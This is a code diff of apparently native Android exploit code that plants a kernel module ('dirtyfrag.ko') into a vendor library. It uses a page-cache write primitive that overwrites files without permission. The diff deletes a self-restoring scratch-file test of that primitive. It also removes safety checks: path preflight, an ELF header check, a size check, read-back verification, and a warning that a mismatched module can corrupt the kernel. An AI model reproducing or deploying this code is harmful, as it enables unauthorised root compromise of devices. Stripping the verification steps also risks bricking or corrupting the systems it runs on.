@@ -285,123 +285,6 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     return rc;
 }
 
-static void report_hex16(struct Reporter *reporter, const char *label,
-                         const uint8_t bytes[16]) {
-    char hex[33];
-    for (int i = 0; i < 16; i++)
-        snprintf(hex + i * 2, sizeof(hex) - (size_t)i * 2, "%02x", bytes[i]);
-    REPORTLN("scratch probe bytes: %s=%s", label, hex);
-}
-
-/* Exercise only the page-cache primitive against an app-private scratch file.
- * The original bytes are restored with an ordinary owned-file write, synced,
- * evicted, reopened, and verified before the caller deletes the file. */
-JNIEXPORT jint JNICALL
-Java_df_root_ExploitRunner_nativeProbeScratch(JNIEnv *env,
-                                               jclass clz __attribute__((unused)),
-                                               jobject reporter_obj,
-                                               jstring scratchPath,
-                                               jint encapPort, jint spi,
-                                               jbyteArray aesCbcKey,
-                                               jbyteArray hmacKey, jint icvLen,
-                                               jint senderPort) {
-    struct Reporter ro = {.env = env, .obj = reporter_obj}, *reporter = &ro;
-    const char *path = (*env)->GetStringUTFChars(env, scratchPath, NULL);
-    if (!path) return 10;
-
-    g_encap_port = (int)encapPort;
-    g_sender_port = (int)senderPort;
-    g_spi = (uint32_t)spi;
-    g_seq = 1;
-    g_icv_len = (int)icvLen;
-
-    jbyte *kb = (*env)->GetByteArrayElements(env, aesCbcKey, NULL);
-    jbyte *hb = (*env)->GetByteArrayElements(env, hmacKey, NULL);
-    if (!kb || !hb) {
-        if (kb) (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
-        if (hb) (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
-        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
-        return 10;
-    }
-    memcpy(g_aes_key, kb, 32);
-    memcpy(g_hmac_key, hb, 32);
-    (*env)->ReleaseByteArrayElements(env, aesCbcKey, kb, JNI_ABORT);
-    (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
-
-    int fd = open(path, O_RDWR | O_CLOEXEC);
-    if (fd < 0) {
-        REPORTLN("scratch probe setup failed: open errno=%d (%s)", errno, strerror(errno));
-        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
-        return 10;
-    }
-
-    struct stat st;
-    int fstat_rc = fstat(fd, &st);
-    if (fstat_rc != 0 || st.st_size < 16) {
-        REPORTLN("scratch probe setup failed: fstat errno=%d size=%lld",
-                 errno, (long long)(fstat_rc == 0 ? st.st_size : -1));
-        close(fd);
-        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
-        return 10;
-    }
-    REPORTLN("scratch probe file: dev=%llu inode=%llu mode=0%o size=%lld offset=0x0 len=16",
-             (unsigned long long)st.st_dev, (unsigned long long)st.st_ino,
-             st.st_mode & 07777, (long long)st.st_size);
-
-    uint8_t before[16], requested[16], observed[16], restored[16];
-    if (pread(fd, before, sizeof(before), 0) != (ssize_t)sizeof(before)) {
-        REPORTLN("scratch probe setup failed: pread errno=%d (%s)", errno, strerror(errno));
-        close(fd);
-        (*env)->ReleaseStringUTFChars(env, scratchPath, path);
-        return 10;
-    }
-    for (int i = 0; i < 16; i++) requested[i] = before[i] ^ 0xa5U;
-    report_hex16(reporter, "before", before);
-    report_hex16(reporter, "requested", requested);
-
-    int transport_rc = patch_file_cbc(path, (const char *)requested, 16, 0, 0, reporter);
-    usleep(50000);
-    ssize_t observed_len = pread(fd, observed, sizeof(observed), 0);
-    report_hex16(reporter, "observed", observed_len == 16 ? observed : before);
-
-    int result;
-    if (transport_rc != 0 || observed_len != 16) {
-        REPORTLN("scratch probe state: transport_failed rc=%d observed_len=%zd",
-                 transport_rc, observed_len);
-        result = 11;
-    } else if (memcmp(observed, requested, 16) == 0) {
-        REPORTLN("scratch probe state: primitive_confirmed_exact_match");
-        result = 0;
-    } else if (memcmp(observed, before, 16) == 0) {
-        REPORTLN("scratch probe state: transport_completed_bytes_unchanged");
-        result = 12;
-    } else {
-        REPORTLN("scratch probe state: ambiguous_unexpected_bytes");
-        result = 13;
-    }
-
-    int restore_ok = pwrite(fd, before, sizeof(before), 0) == (ssize_t)sizeof(before)
-                     && fsync(fd) == 0;
-    posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
-    close(fd);
-    fd = open(path, O_RDONLY | O_CLOEXEC);
-    if (fd < 0 || pread(fd, restored, sizeof(restored), 0) != (ssize_t)sizeof(restored)) {
-        restore_ok = 0;
-        memset(restored, 0, sizeof(restored));
-    }
-    if (fd >= 0) close(fd);
-    report_hex16(reporter, "reopened_after_restore", restored);
-    if (!restore_ok || memcmp(restored, before, 16) != 0) {
-        REPORTLN("scratch probe cleanup state: restore_verification_failed");
-        result = 14;
-    } else {
-        REPORTLN("scratch probe cleanup state: restored_and_reopened_exact_match");
-    }
-
-    (*env)->ReleaseStringUTFChars(env, scratchPath, path);
-    return result;
-}
-
 /* ---- KO and splicehelper blobs (identical layout to DFReroot) ---- */
 
 extern char libcxx_start[];
@@ -468,7 +351,6 @@ static const struct KoImage *select_ko_image(int andr, int major, int minor) {
         if (imgs[i].kver_major != major || imgs[i].kver_minor != minor) continue;
         if (imgs[i].android_release == andr) return &imgs[i];
     }
-    /* A same-version module from another Android KMI can corrupt the kernel. */
     return NULL;
 }
 
@@ -504,14 +386,6 @@ static int patch_ko(struct Reporter *reporter) {
     if (!ko) {
         REPORTLN("unsupported kernel %d.%d android %d", major, minor, andr); return 1;
     }
-    struct stat path_stat, carrier_stat;
-    if (lstat(kCrashDump, &path_stat) != 0 ||
-        stat(libcxx_ko_target, &carrier_stat) != 0 ||
-        lstat("/vendor/bin/insmod", &path_stat) != 0 ||
-        lstat("/system/lib64/libc++.so", &path_stat) != 0) {
-        REPORTLN("required payload path missing; run tools/device_preflight.py first");
-        return 1;
-    }
     REPORTLN("* ko android%d-%d.%d (%d bytes)",
              ko->android_release, ko->kver_major, ko->kver_minor,
              (int)(ko->end - ko->start));
@@ -529,38 +403,13 @@ static int patch_ko(struct Reporter *reporter) {
     free(sh_buf);
     if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
-    uint8_t vendor_header[16];
-    if (read_vendor_content(0, vendor_header, reporter) != 0 ||
-        memcmp(vendor_header, "\x7f" "ELF", 4) != 0) {
-        REPORTLN("vendor carrier read preflight failed; aborting before module write");
-        return 1;
-    }
-
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
-    if ((off_t)ko_len_padded > carrier_stat.st_size) {
-        REPORTLN("vendor carrier is too small: %lld < %zu",
-                 (long long)carrier_stat.st_size, ko_len_padded);
-        free(ko_buf);
-        return 1;
-    }
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
     REPORTLN("* patch #2 (%s ← dirtyfrag.ko, %zu bytes)", libcxx_ko_target, ko_len_padded);
     ret = patch_file_cbc(libcxx_ko_target, ko_buf, ko_len_padded, 0, 1, reporter);
-    if (!ret) {
-        uint8_t actual[16];
-        for (size_t off = 0; off < ko_len_padded; off += 16) {
-            if (read_vendor_content((off_t)off, actual, reporter) != 0 ||
-                memcmp(actual, ko_buf + off, 16) != 0) {
-                REPORTLN("module read-back mismatch at 0x%zx", off);
-                ret = 1;
-                break;
-            }
-        }
-        if (!ret) REPORTLN("module read-back verified: %zu bytes", ko_len_padded);
-    }
     free(ko_buf);
     if (ret) REPORTLN("patch #2 failed: %d", ret);
     return ret;
